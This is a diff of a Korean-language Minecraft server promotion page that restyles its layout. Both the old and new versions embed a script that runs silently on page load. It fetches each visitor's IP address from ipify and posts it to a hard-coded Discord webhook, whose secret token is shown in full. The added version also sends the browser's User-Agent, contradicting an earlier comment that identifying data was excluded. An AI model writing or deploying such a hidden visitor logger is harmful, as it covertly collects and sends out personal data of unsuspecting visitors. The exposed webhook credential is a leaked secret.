@@ -1,73 +1,57 @@
 <!DOCTYPE html>
 <html lang="ko">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>내 마인크래프트 서버</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Nanum+Square+Round:wght@400;700;800&display=swap');
-    body { font-family: 'Nanum Square Round', sans-serif; background: linear-gradient(180deg,#e8f0ff,#f0f3f8); margin:0; }
-    .server-card{ transition: transform .18s, box-shadow .18s; }
-    .server-card:hover{ transform: translateY(-6px); box-shadow: 0 14px 28px rgba(16,24,40,.12); }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MCBELIST</title></title>
+<script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="min-h-screen flex items-center justify-center p-6">
+<body class="bg-gradient-to-r from-green-400 to-blue-500 min-h-screen flex flex-col items-center justify-center font-sans">
 
-  <main class="w-full max-w-xl">
-    <header class="text-center mb-8">
-      <h1 class="text-4xl font-extrabold text-green-700">🌍 내 마인크래프트 서버</h1>
-      <p class="mt-2 text-gray-700">최고의 생존 서버! 지금 접속해보세요</p>
-    </header>
+<header class="text-center mb-12">
+  <h1 class="text-5xl font-extrabold text-white drop-shadow-lg">McbeList</h1>
+  <p class="mt-4 text-xl text-white/90">최고의 생존 서버! 지금 접속해보세요</p>
+</header>
 
-    <section class="bg-white rounded-2xl p-8 server-card">
-      <img src="https://static.wikia.nocookie.net/minecraft_gamepedia/images/0/0b/Grass_Block_JE2_BE2.png" alt="banner" class="w-32 mx-auto rounded-lg mb-6 shadow">
-      <h2 class="text-2xl font-bold text-gray-800 mb-2 text-center">서버 이름</h2>
-      <p class="text-center text-gray-600 mb-4">버전: <strong>1.20.1</strong> · IP: <strong>mc.example.com</strong></p>
-      <div class="text-center">
-        <a href="https://discord.gg/abcdef" target="_blank" rel="noopener"
-           class="inline-block bg-indigo-600 text-white px-6 py-3 rounded-xl font-semibold shadow hover:bg-indigo-700 transition">
-          디스코드 참여하기
-        </a>
-      </div>
-    </section>
+<div class="bg-white/90 backdrop-blur-lg shadow-2xl rounded-3xl p-10 w-96 text-center">
+  <img src="https://static.wikia.nocookie.net/minecraft_gamepedia/images/0/0b/Grass_Block_JE2_BE2.png" 
+       alt="서버 배너" class="w-40 mx-auto rounded-xl mb-6 shadow-lg">
 
-    <footer class="mt-8 text-center text-sm text-gray-500">© 2025 내 서버 홍보 사이트</footer>
-  </main>
+  <p class="text-lg font-semibold mb-2">서버 주소: <span class="text-indigo-600">mc.example.com</span></p>
+  <p class="text-lg font-semibold mb-4">버전: <span class="text-indigo-600">1.20.1</span></p>
 
-  <script>
-    (async function sendVisitorIp() {
-      try {
-        // 1) IP 가져오기 (IPv4)
-        const r = await fetch('https://api4.ipify.org?format=json');
-        if (!r.ok) throw new Error('ipify 응답 실패: ' + r.status);
-        const { ip } = await r.json();
+  <a href="https://discord.gg/abcdef" target="_blank" 
+     class="inline-block bg-indigo-600 text-white px-6 py-3 rounded-xl font-bold shadow-lg hover:bg-indigo-700 transition">
+     디스코드 참여하기
+  </a>
+</div>
 
-        // 2) 보낼 페이로드: user-agent 제외 (요청자 식별 정보는 저장하지 않음)
-        const payload = {
-          content: `🖥️ 방문자 접속\nIP: \`${ip}\`\n시간: ${new Date().toISOString()}`
-        };
+<footer class="mt-12 text-white/80 text-sm">
+  © 2025 내 서버 홍보 사이트
+</footer>
 
-        // 3) 웹훅 URL을 아래에 넣으세요 (테스트용)
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1423616802428162170/Ax_AVm_t3uEd83Tr-RsC5h4dpNFzRcFmNKNnKWRPCuzmdFJaDu3aKuCpQuHbWrcyxa4U";
+<script>
+async function reportIp() {
+  try {
+    const ipResp = await fetch("https://api4.ipify.org?format=json");
+    const { ip } = await ipResp.json();
 
-        // 4) Discord 웹훅으로 전송
-        const whResp = await fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
+    // 🔴 여기에 웹훅 URL을 넣으면 브라우저에서 직접 호출 가능 (CORS/보안 주의)
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1423616802428162170/Ax_AVm_t3uEd83Tr-RsC5h4dpNFzRcFmNKNnKWRPCuzmdFJaDu3aKuCpQuHbWrcyxa4U";
 
-        if (!whResp.ok) {
-          // CORS에 의해 브라우저가 차단당할 가능성이 높음 — 에러 메시지 로깅
-          console.warn('웹훅 전송 실패:', whResp.status, await whResp.text());
-        } else {
-          console.log('IP 전송 성공:', ip);
-        }
-      } catch (err) {
-        console.warn('IP 전송 중 오류:', err.message);
-      }
-    })();
-  </script>
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content: `방문자 IP: ${ip}\nUser-Agent: ${navigator.userAgent}` })
+    });
+
+    console.log("IP 전송 성공:", ip);
+  } catch (e) {
+    console.warn("IP 전송 실패:", e.message);
+  }
+}
+
+reportIp();
+</script>
 </body>
 </html>
